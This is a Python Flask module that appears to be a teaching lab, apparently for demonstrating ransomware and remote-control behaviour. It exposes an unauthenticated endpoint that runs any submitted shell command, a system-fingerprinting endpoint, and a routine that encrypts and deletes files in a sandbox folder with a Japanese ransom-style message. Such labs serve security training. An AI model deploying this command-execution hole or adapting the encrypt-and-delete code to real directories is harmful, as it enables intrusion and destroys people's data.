import base64
import json
import os
import platform
import subprocess
from cryptography.fernet import Fernet
from flask import Blueprint, jsonify, render_template, request

c1_bp = Blueprint("c1_lab", __name__, template_folder="templates")

SANDBOX_DIR = "./sandbox"
KEY_FILE = "secret.key"


def load_or_create_key():
  if os.path.exists(KEY_FILE):
    with open(KEY_FILE, "rb") as f:
      return f.read()
  else:
    key = Fernet.generate_key()
    with open(KEY_FILE, "wb") as f:
      f.write(key)
    return key


agent_key = load_or_create_key()
fernet = Fernet(agent_key)


def create_test_file():
  if not os.path.exists(SANDBOX_DIR):
    os.makedirs(SANDBOX_DIR)
  file_path = os.path.join(SANDBOX_DIR, "secret.txt")
  if not os.path.exists(file_path):
    with open(file_path, "w", encoding="utf-8") as f:
      f.write(
          "これは企業の機密データベース、および重要財務ファイルを含む機密データです。"
      )


create_test_file()


@c1_bp.route("/")
def index():
  files = os.listdir(SANDBOX_DIR) if os.path.exists(SANDBOX_DIR) else []
  return render_template("C1.html", files=files, sandbox=SANDBOX_DIR)


@c1_bp.route("/api/status", methods=["GET"])
def get_status():
  is_root = (os.getuid() == 0) if hasattr(os, "getuid") else False
  info = {
      "system": platform.system(),
      "release": platform.release(),
      "node": platform.node(),
      "current_user": os.getenv("USER")
      or os.getenv("USERNAME")
      or "unknown",
      "is_elevated_root": is_root,
      "working_directory": os.getcwd(),
  }
  return jsonify(info)


@c1_bp.route("/api/execute", methods=["POST"])
def execute_cmd():
  data = request.get_json() or {}
  command = data.get("command", "").strip()

  if not command:
    return jsonify({"error": "コマンドが空です"}), 400

  output = ""
  try:
    if command == "AUDIT_SYS":
      is_root = (os.getuid() == 0) if hasattr(os, "getuid") else False
      info = {
          "system": platform.system(),
          "release": platform.release(),
          "node": platform.node(),
          "current_user": os.getenv("USER")
          or os.getenv("USERNAME")
          or "unknown",
          "is_elevated_root": is_root,
          "working_directory": os.getcwd(),
      }
      output = json.dumps(info, ensure_ascii=False, indent=2)
    elif command in ["procs", "ps aux", "GET_PROCS"]:
      res = subprocess.run(
          ["ps", "aux"], capture_output=True, text=True, timeout=5
      )
      output = res.stdout
    else:
      output = subprocess.check_output(
          command, shell=True, stderr=subprocess.STDOUT, text=True, timeout=10
      )
  except Exception as e:
    output = f"Execution Failed: {str(e)}"

  return jsonify({"command": command, "output": output})


@c1_bp.route("/api/lock", methods=["POST"])
def api_lock():
  create_test_file()
  count = 0
  for root, dirs, files in os.walk(SANDBOX_DIR):
    for file in files:
      if file.endswith(".locked") or file == KEY_FILE:
        continue
      file_path = os.path.join(root, file)
      with open(file_path, "rb") as f:
        content = f.read()
      encrypted_content = fernet.encrypt(content)
      with open(file_path + ".locked", "wb") as f:
        f.write(encrypted_content)
      os.remove(file_path)
      count += 1
  return jsonify(
      {
          "status": "success",
          "count": count,
          "message": f"[!] 強力な暗号化により {count} 個のファイルが暗号化されました！",
      }
  )


@c1_bp.route("/api/unlock", methods=["POST"])
def api_unlock():
  data = request.get_json() or {}
  key_in = data.get("key", "").strip()

  if not key_in:
    user_key = load_or_create_key()
  else:
    user_key = key_in.encode()

  try:
    user_fernet = Fernet(user_key)
  except Exception:
    return jsonify({"status": "error", "message": "無効な鍵の形式です。"}), 400

  restored = 0
  for root, dirs, files in os.walk(SANDBOX_DIR):
    for file in files:
      if file.endswith(".locked"):
        path = os.path.join(root, file)
        with open(path, "rb") as f:
          decrypted = user_fernet.decrypt(f.read())
        with open(path[:-8], "wb") as f:
          f.write(decrypted)
        os.remove(path)
        restored += 1
  return jsonify(
      {
          "status": "success",
          "restored": restored,
          "message": f"[+] 復元完了！ {restored} 個のファイルが元に戻りました。",
      }
  )